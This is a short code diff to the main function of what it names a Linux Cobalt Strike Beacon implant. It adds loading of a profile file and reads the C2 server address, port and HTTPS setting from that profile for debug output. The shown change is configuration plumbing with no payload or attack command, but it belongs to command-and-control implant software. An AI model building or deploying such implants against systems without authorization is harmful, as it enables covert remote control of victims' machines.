@@ -5,6 +5,7 @@
 #include <signal.h>
 #include "beacon.h"
 #include "config.h"
+#include "profile.h"
 #include "debug.h"
 #include "files.h"
 #include "pivot.h"
@@ -41,10 +42,15 @@ int main(void)
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
     
+    if (profile_load() != 0) {
+        DEBUG_PRINT("Failed to load profile configuration\n");
+        return 1;
+    }
+
     DEBUG_PRINT("Linux Cobalt Strike Beacon %s\n", IMPLANT_VERSION);
-    DEBUG_PRINT("C2 Server: %s:%d\n", C2_SERVER, C2_PORT);
+    DEBUG_PRINT("C2 Server: %s:%d\n", profile_get_server(), profile_get_port());
     DEBUG_PRINT("Sleep: %dms, Jitter: %d%%\n", g_sleep_time_ms, g_jitter_percent);
-    DEBUG_PRINT("HTTPS value: %d\n", C2_USE_HTTPS);
+    DEBUG_PRINT("HTTPS value: %d\n", profile_get_use_https());
     
     // Initialize beacon
     if (beacon_init(&state) != 0) {
